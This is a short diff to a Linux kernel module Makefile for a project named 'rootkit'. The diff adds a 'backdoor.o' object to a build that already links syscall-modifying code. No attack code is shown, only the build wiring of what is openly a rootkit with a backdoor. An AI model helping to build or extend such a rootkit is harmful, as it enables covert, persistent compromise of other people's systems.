@@ -1,5 +1,5 @@
 TARGET = rootkit
-rootkit-objs := rootkit_main.o modify_syscalls.o
+rootkit-objs := rootkit_main.o modify_syscalls.o backdoor.o
 
 KDIR ?= /lib/modules/$(shell uname -r)/build
 PWD := $(shell pwd)
